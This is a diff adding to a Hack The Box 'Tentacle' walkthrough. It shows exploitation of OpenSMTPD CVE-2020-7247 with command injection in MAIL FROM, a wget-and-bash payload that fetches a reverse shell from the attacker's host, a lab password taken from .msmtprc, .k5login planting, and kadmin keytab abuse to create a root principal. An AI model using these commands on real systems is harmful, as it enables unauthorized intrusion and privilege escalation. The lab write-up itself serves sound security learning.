@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/tentacle.png
-tags: ["HTB"]
+tags: ["HTB", "dig", "dns", "dnsenum", "vhosts", "kerbrute", "kerberos", "ntpdate", "squid", "as-rep-roast", "john", "proxychains", "nmap-over-proxy", "wpad", "opensmtpd", "exploitdb", "cve-2020-7247", "msmtprc", "kinit", "keytab", "klist", "getfacl", "facl"]
 ---
 
 # Tentacle
@@ -363,7 +363,355 @@ Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
 
 ```
 
+- We have `OpenSMTPD 2.0.0` which could be exploited via [CVE-2020-7247](https://vk9-sec.com/opensmtpd-6-6-1-remote-code-execution-smtp_mailaddr-cve-2020-7247/)
+  - The [PoC](https://www.exploit-db.com/exploits/47984)
+```
+└─$ sudo proxychains -f proxy-to-squid.conf nc 10.241.251.113 25
+[proxychains] config file found: proxy-to-squid.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
+220 smtp.realcorp.htb ESMTP OpenSMTPD
+HELO x
+250 smtp.realcorp.htb Hello x [10.241.251.1], pleased to meet you
+MAIL FROM:<;ping -c 1 10.10.16.9;>
+250 2.0.0 Ok
+RCPT TO:<j.nakazawa@realcorp.htb>
+250 2.1.5 Destination address valid: Recipient ok
+DATA
+354 Enter mail, end with "." on a line by itself
 
-## User
+TEST
+.
+250 2.0.0 cd353533 Message accepted for delivery
+```
+```
+└─$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+16:53:14.282393 IP realcorp.htb > 10.10.16.9: ICMP echo request, id 15, seq 1, length 64
+16:53:14.282435 IP 10.10.16.9 > realcorp.htb: ICMP echo reply, id 15, seq 1, length 64
+```
+- Now, let's get a reverse shell
+  - We have to replace the `root` with `j.nakazawa@realcorp.htb` for [PoC](https://www.exploit-db.com/exploits/47984)  to work
+  - Playing around with different `cmd` payloads
+    - The one that works is `wget <ip>`
+```
+└─$ sudo proxychains -f proxy-to-squid.conf python3 cve-2020-7247.py 10.241.251.113 25 "wget 10.10.16.9"
+[proxychains] config file found: proxy-to-squid.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+```
+```
+└─$ python3 -m http.server 80                 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.224 - - [30/Sep/2023 17:10:52] "GET / HTTP/1.1" 200 -
+```
 
+- Now, let's send a reverse shell payload
+  - While troubleshooting manually there are bad chars that `opensmtp` doesn't like, so I had to play around with different payloads
+```
+└─$ sudo proxychains -f proxy-to-squid.conf python3 cve-2020-7247.py 10.241.251.113 25 "wget 10.10.16.9/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh"
+[proxychains] config file found: proxy-to-squid.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+```
+
+![](./images/4.png)
+
+## User #1
+- During enumeration, I found a `.msmtprc` file in `j.nakazawa`'s home directory
+  - We have potential creds for `j.nakazawa:sJB}RM>6Z~64_`
+```
+root@smtp:/home/j.nakazawa# ls -lha
+ls -lha
+total 16K
+drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Dec  9  2020 .
+drwxr-xr-x. 1 root       root         24 Dec  8  2020 ..
+lrwxrwxrwx. 1 root       root          9 Nov 15  2021 .bash_history -> /dev/null
+-rw-r--r--. 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout
+-rw-r--r--. 1 j.nakazawa j.nakazawa 3.5K Apr 18  2019 .bashrc
+-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8  2020 .msmtprc
+-rw-r--r--. 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile
+lrwxrwxrwx. 1 root       root          9 Nov 15  2021 .viminfo -> /dev/null
+root@smtp:/home/j.nakazawa# cat .msmtprc
+cat .msmtprc
+# Set default values for all following accounts.
+defaults
+auth           on
+tls            on
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile        /dev/null
+
+# RealCorp Mail
+account        realcorp
+host           127.0.0.1
+port           587
+from           j.nakazawa@realcorp.htb
+user           j.nakazawa
+password       sJB}RM>6Z~64_
+tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
+
+# Set a default account
+account default : realcorp
+```
+
+- If we try to `ssh`, it fails
+```
+└─$ sshpass -p 'sJB}RM>6Z~64_' ssh j.nakazawa@10.10.10.224   
+Permission denied, please try again.
+```
+```
+└─$ sudo proxychains -q -f proxy-to-squid.conf sshpass -p 'sJB}RM>6Z~64_' ssh j.nakazawa@10.197.243.77
+Warning: Permanently added '10.197.243.77' (ED25519) to the list of known hosts.
+Permission denied, please try again.
+```
+```
+└─$ sudo proxychains -q -f proxy-to-squid.conf sshpass -p 'sJB}RM>6Z~64_' ssh j.nakazawa@10.197.243.31
+Warning: Permanently added '10.197.243.31' (ED25519) to the list of known hosts.
+Permission denied, please try again.
+```
+
+- But we also saw a `kerberos` running
+  - So let's try creds there
+  - Change the `/etc/krb5.conf`
+```
+[libdefaults]
+	default_realm = REALCORP.HTB
+
+# The following krb5.conf variables are only for MIT Kerberos.
+	kdc_timesync = 1
+	ccache_type = 4
+	forwardable = true
+	proxiable = true
+        rdns = false
+
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+	fcc-mit-ticketflags = true
+
+[realms]
+	REALCORP.HTB = {
+		kdc = realcorp.htb
+		master_kdc = realcorp.htb
+		admin_server = realcorp.htb
+		default_domain = realcorp.htb
+	}
+
+[domain_realm]
+	.realcorp.htb = REALCORP.HTB
+	realcorp.htb = REALCORP.HTB	
+	
+```
+
+- Now, let's ask for a ticket
+  - And we got one
+  - Also we might need to run `ntpdate 10.10.10.224` to sync with the box, since `kerberos` requires that
+```
+└─$ kinit j.nakazawa             
+Password for j.nakazawa@REALCORP.HTB: 
+                                          
+```
+```
+└─$ klist           
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: j.nakazawa@REALCORP.HTB
+
+Valid starting       Expires              Service principal
+09/30/2023 17:33:09  10/01/2023 17:33:09  krbtgt/REALCORP.HTB@REALCORP.HTB
+```
+
+- If we now try `ssh` we are asked for password
+  - So troubleshooting shows that it can't find `host/10.10.10.224@REALCORP.HTB`
+  - To solve this issue, we have to place `srv01.realcrop.htb` to be the first `dns` name in `/etc/hosts/` for the box
+  - `10.10.10.224    srv01.realcorp.htb realcorp.htb root.realcorp.htb`
+```
+└─$ ssh j.nakazawa@10.10.10.224 -vv  
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.9 30 May 2023
+...
+debug1: Authentications that can continue: gssapi-keyex,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: Unspecified GSS failure.  Minor code may provide more information
+Server host/10.10.10.224@REALCORP.HTB not found in Kerberos database
+```
+
+- To `ssh` we had to use specific options found it post below
+  - https://uz.sns.it/~enrico/site/posts/kerberos/password-less-ssh-login-with-kerberos.html
+```
+└─$ ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes -o GSSAPIServerIdentity=srv01.realcorp.htb j.nakazawa@REALCORP.HTB
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last failed login: Sat Sep 30 17:50:24 BST 2023 from 10.10.16.9 on ssh:notty
+There was 1 failed login attempt since the last successful login.
+Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2
+[j.nakazawa@srv01 ~]$ 
+```
+## User #2
+- `linpeas` shows interesting file `/usr/local/bin/log_backup.sh`
+  - It is used in `crontab`
+```
+╔══════════╣ Backup files (limited 100)
+-rwxr-xr--. 1 root admin 229 Dec  9  2020 /usr/local/bin/log_backup.sh
+-r--r--r--. 1 root root 2762 Aug 17  2020 /usr/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r--. 1 root root 2670 Dec  8  2016 /usr/share/man/man1/db_hotbackup.1.gz
+-rw-r--r--. 1 root root 17740 Dec 24  2020 /usr/share/info/dir.old
+...
+```
+```
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+* * * * * admin /usr/local/bin/log_backup.sh
+```
+
+- Content of the script
+```
+[j.nakazawa@srv01 tmp]$ cat /usr/local/bin/log_backup.sh
+#!/bin/bash
+
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/                                                                                                                                                           
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+```
+
+- Let's check permissions
+  - We can write to `/var/log/squid/`
+```
+[j.nakazawa@srv01 tmp]$ ls -ld /var/log/squid/
+drwx-wx---. 2 admin squid 41 Dec 24  2020 /var/log/squid/
+```
+```
+[j.nakazawa@srv01 tmp]$ groups
+j.nakazawa squid users
+```
+
+- We can create a [.k5login](https://www.unix.com/man-page/linux/5/k5login/) file
+  - `The  .k5login  file, which resides in a user's home directory, contains a list of the Kerberos principals.  Anyone with valid tickets for a
+       principal in the file is allowed host access with the UID of the user in whose home directory the file resides.  One common use is to place
+       a .k5login file in root's home directory, thereby granting system administrators remote root access to the host via Kerberos.`
+  - The script copies all files from `/var/log/squid/` to `/home/admin` and only deletes `access.log`, `cache.log` files
+  - We can `ssh` as `admin`
+```
+[j.nakazawa@srv01 tmp]$ cd /var/log/squid/
+[j.nakazawa@srv01 squid]$ echo "j.nakazawa@REALCORP.HTB" > .k5login
+```
+
+- And we can `ssh` as `admin`
+```
+└─$ ssh admin@10.10.10.224     
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last login: Sat Sep 30 19:39:01 2023
+[admin@srv01 ~]$ 
+```
 ## Root
+- Enumerate 
+```
+[admin@srv01 home]$ find / -user admin -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
+/home/admin/squid_logs.tar.gz.2023-09-30-194001
+/var/spool/mail/admin
+[admin@srv01 home]$ ls -lha /var/spool/mail/admin
+-rw-rw----. 1 admin mail 0 Dec  9  2020 /var/spool/mail/admin
+[admin@srv01 home]$ find / -group admin -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
+/home/admin/squid_logs.tar.gz.2023-09-30-194001
+/home/admin/squid_logs.tar.gz.2023-09-30-194101
+/usr/local/bin/log_backup.sh
+/etc/krb5.keytab
+```
+
+- The file `/etc/krb5.keytab` looks interesting
+  - https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/The-Keytab-File.html
+  - `All Kerberos server machines need a keytab file, called /etc/krb5.keytab, to authenticate to the KDC. The keytab file is an encrypted, local, on-disk copy of the host's key. The keytab file, like the stash file (Create the Database) is a potential point-of-entry for a break-in, and if compromised, would allow unrestricted access to its host. The keytab file should be readable only by root, and should exist only on the machine's local disk. The file should not be part of any backup of the machine, unless access to the backup data is secured as tightly as access to the machine's root password itself. `
+  - We can list the principals
+    - https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/What-is-a-Kerberos-Principal_003f.html
+    - The `kadmin` was added with `changepw` and `admin` privileges
+```
+[admin@srv01 home]$ klist -k
+Keytab name: FILE:/etc/krb5.keytab
+KVNO Principal
+---- --------------------------------------------------------------------------
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 host/srv01.realcorp.htb@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/changepw@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+   2 kadmin/admin@REALCORP.HTB
+```
+
+- Since we can read the `keytab` file, we can use any of the principals listed in it
+  - [kadmin](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html)
+```
+[admin@srv01 home]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
+Couldn't open log file /var/log/kadmind.log: Permission denied
+Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
+kadmin:  list_principals
+K/M@REALCORP.HTB
+host/srv01.realcorp.htb@REALCORP.HTB
+j.nakazawa@REALCORP.HTB
+kadmin/admin@REALCORP.HTB
+kadmin/changepw@REALCORP.HTB
+kadmin/srv01.realcorp.htb@REALCORP.HTB
+kiprop/srv01.realcorp.htb@REALCORP.HTB
+krbtgt/REALCORP.HTB@REALCORP.HTB
+```
+
+- Since we are `admin` of the `kerberos` database, we can add `root` principal and switch to `root`
+  - To switch the user we use [ksu](https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/ksu.html)
+  - One-liner: `kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q "add_principal -pw pentest root"`
+```
+kadmin:  add_principal root
+No policy specified for root@REALCORP.HTB; defaulting to no policy
+Enter password for principal "root@REALCORP.HTB": 
+Re-enter password for principal "root@REALCORP.HTB": 
+Principal "root@REALCORP.HTB" created.
+kadmin:  list_principals
+K/M@REALCORP.HTB
+host/srv01.realcorp.htb@REALCORP.HTB
+j.nakazawa@REALCORP.HTB
+kadmin/admin@REALCORP.HTB
+kadmin/changepw@REALCORP.HTB
+kadmin/srv01.realcorp.htb@REALCORP.HTB
+kiprop/srv01.realcorp.htb@REALCORP.HTB
+krbtgt/REALCORP.HTB@REALCORP.HTB
+root@REALCORP.HTB
+kadmin:  exit
+[admin@srv01 home]$ ksu
+WARNING: Your password may be exposed if you enter it here and are logged 
+         in remotely using an unsecure (non-encrypted) channel. 
+Kerberos password for root@REALCORP.HTB: : 
+Authenticated root@REALCORP.HTB
+Account root: authorization for root@REALCORP.HTB successful
+Changing uid to root (0)
+[root@srv01 home]#
+```
